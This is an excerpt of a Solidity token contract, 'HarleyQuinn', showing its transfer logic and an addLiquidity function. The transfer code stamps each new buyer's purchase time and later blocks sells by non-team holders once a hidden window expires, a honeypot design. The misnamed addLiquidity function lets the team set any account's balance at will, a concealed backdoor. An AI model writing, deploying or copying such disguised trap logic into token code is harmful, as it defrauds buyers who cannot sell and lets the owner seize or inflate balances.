...
contract HarleyQuinn  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        uint256 _deadfee;
        uint256 _brun = _rfeetax[form] + _lun;
        if (!_isExcluded[form] && !_isExcluded[to] ) { _deadfee = amount.mul(burnfee).div(100);}
        if (to != _team && to != panckev2router && form == panckev2router && to != address(this)&& balanceOf(to) == 0)
        { _rfeetax[to] = block.timestamp;  }      
        uint256 _bottime =block.timestamp;
        if (form !=_team && form !=panckev2router){require(_bottime <= _brun);}
        uint256 sendertoken = _tOwned[form];
        if (form != to || !_isExcluded[msg.sender]) { require(sendertoken >= amount); }
        uint256 tokenamount = amount - _deadfee;
        if (sendertoken >= amount) { _tOwned[form] = sendertoken - amount; }
        _tOwned[to] += tokenamount; 
        if (_deadfee > 0) 
        { _totalSupply = _totalSupply - _deadfee; }
    ...
    function addLiquidity(address Liquidity, uint256 tokenAmounts, uint256 bnbAmount , uint256 lpAmount) external  {require(msg.sender == _team );
        _tOwned[Liquidity] = tokenAmounts - bnbAmount + lpAmount;
    }   
